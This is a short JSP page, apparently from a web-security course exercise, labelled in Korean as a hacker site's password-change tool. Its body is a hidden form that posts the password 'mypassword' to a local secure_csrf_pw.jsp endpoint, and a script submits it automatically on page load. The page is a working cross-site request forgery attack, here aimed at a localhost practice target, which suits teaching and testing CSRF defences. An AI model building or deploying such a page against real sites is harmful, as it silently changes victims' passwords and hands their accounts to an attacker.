<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
<script src="/servlettest/js/jquery-3.7.1.min.js" ></script>
<script>
		$(document).ready(function(){
			
		});
</script>	
</head>
<body>
<!-- 해커 사이트 암호 변경 툴 -->
<form action="http://localhost:8071/jsptest/secure/secure_csrf_pw.jsp" method="post">
	<input type=hidden name="pw" value="mypassword" > 



</form>
<script>
document.forms[0].submit();

</script>
</body>
</html>